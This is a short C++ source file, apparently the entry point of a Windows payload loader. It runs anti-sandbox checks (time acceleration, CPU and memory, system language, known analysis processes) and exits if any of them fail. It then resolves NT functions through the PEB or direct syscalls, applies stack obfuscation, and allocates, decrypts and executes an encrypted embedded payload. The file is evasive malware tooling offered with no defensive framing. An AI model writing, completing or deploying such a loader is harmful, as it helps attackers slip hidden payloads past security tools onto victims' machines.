#include "struct.h"
#include "myapi.h"    
#include "windows.h"
#include <stdio.h>
#include "result.h"
#include "config.h"

extern "C" void _pei386_runtime_relocator(void) {}

void* mymemcpy1(void* dest, const void* src, size_t n)
{
    if (dest == NULL || src == NULL)
        return NULL;
    char* pDest = static_cast <char*>(dest);
    const char* pSrc = static_cast <const char*>(src);
    if (pDest > pSrc && pDest < pSrc + n)
    {
        for (size_t i = n - 1; i != -1; --i)
        {
            pDest[i] = pSrc[i];
        }
    }
    else
    {
        for (size_t i = 0; i < n; i++)
        {
            pDest[i] = pSrc[i];
        }
    }

    return dest;
}

void CheckSandbox() {
    BOOL antiResult = TRUE;

    antiResult = antiResult && (!antiMethod.ctime_acceleration || check_time_acceleration());
    antiResult = antiResult && (!antiMethod.cCPUandMem || check_CPUandMem());
    antiResult = antiResult && (!antiMethod.cLanguage || AntiSandbox_LanguageCheck());
    antiResult = antiResult && (!antiMethod.cprocesses || check_known_processes());

    if (!antiResult) {
        exit(0);
    }
}



int main(){

    CheckSandbox();

    if (ChooseNtfuns.Peb_Ntdll) {
        FindNtFunctions();
    }
    
    if (ChooseNtfuns.SysCall) {
        FindNtFunctionsBySyscall();
    }


   ExportSetupMemoryProtection();


   ExportSetupStackObfuscation();
        
    




    allocMemFunc(enc_data,enc_size,&ChooseMemNtFuncs);

    decrypt_buffer(&decryptfunc);

    excuteFunc(&exeMethod);

}

